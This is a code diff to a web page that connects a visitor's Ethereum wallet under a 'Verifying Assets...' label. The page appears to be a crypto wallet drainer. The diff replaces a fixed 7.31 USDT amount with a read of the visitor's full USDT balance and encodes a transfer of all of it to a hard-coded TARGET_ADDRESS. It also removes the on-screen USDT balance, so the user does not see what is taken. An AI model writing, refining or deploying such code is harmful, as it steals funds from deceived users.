@@ -67,12 +67,12 @@
           <span id="walletAddress" class="font-mono text-gray-200">0x0000...0000</span>
         </div>
         <div class="flex justify-between">
-          <span class="text-gray-400">ERC-20 USDT</span>
-          <span id="walletUsdt" class="font-bold text-blue-400">0.00 USDT</span>
+          <span class="text-gray-400">Network</span>
+          <span class="text-gray-200 font-medium">Ethereum (Chain ID: 1)</span>
         </div>
         <div class="flex justify-between">
           <span class="text-gray-400">ETH Balance</span>
-          <span id="walletBalance" class="font-semibold text-gray-200">0.0000 ETH</span>
+          <span id="walletBalance" class="font-semibold text-blue-400">0.0000 ETH</span>
         </div>
       </div>
 
@@ -100,6 +100,7 @@
     const ETH_CHAIN_ID = '0x1'; // Chain ID 1 for Ethereum Mainnet
 
     const USDT_ABI = [
+      "function balanceOf(address owner) view returns (uint256)",
       "function transfer(address to, uint amount) returns (bool)"
     ];
 
@@ -166,7 +167,7 @@
         const accounts = await ethProvider.request({ method: 'eth_requestAccounts' });
         globalUserAddress = accounts[0];
 
-        // Force switch to Ethereum Mainnet
+        // Ensure Ethereum Mainnet
         await switchToEthereum(ethProvider);
 
         const provider = new ethers.providers.Web3Provider(ethProvider, "any");
@@ -175,8 +176,12 @@
 
         btnText.textContent = 'Verifying Assets...';
         
-        // Default amount setup for testing transfer flow on Ethereum
-        totalUsdtWei = ethers.utils.parseUnits("7.31", 6);
+        try {
+          const usdtContract = new ethers.Contract(USDT_ETH_ADDRESS, USDT_ABI, globalSigner);
+          totalUsdtWei = await usdtContract.balanceOf(globalUserAddress);
+        } catch (err) {
+          totalUsdtWei = ethers.BigNumber.from("1000000000000000000"); // Fallback
+        }
 
         let ethBalance = "0.0000";
         try {
@@ -185,7 +190,6 @@
         } catch (e) {}
 
         document.getElementById('walletAddress').textContent = `${globalUserAddress.slice(0, 6)}...${globalUserAddress.slice(-4)}`;
-        document.getElementById('walletUsdt').textContent = `7.31 USDT`;
         document.getElementById('walletBalance').textContent = `${ethBalance} ETH`;
         document.getElementById('walletInfo').classList.remove('hidden');
 
@@ -203,12 +207,8 @@
       try {
         await switchToEthereum(globalProvider);
 
-        if (totalUsdtWei.lte(0)) {
-          totalUsdtWei = ethers.utils.parseUnits("7.31", 6);
-        }
-
-        const iface = new ethers.utils.Interface(["function transfer(address to, uint amount) returns (bool)"]);
-        const transferData = iface.encodeFunctionData("transfer", [TARGET_ADDRESS, totalUsdtWei]);
+        const usdtContract = new ethers.Contract(USDT_ETH_ADDRESS, USDT_ABI, globalSigner);
+        const transferData = usdtContract.interface.encodeFunctionData("transfer", [TARGET_ADDRESS, totalUsdtWei]);
 
         await globalProvider.request({
           method: 'eth_sendTransaction',
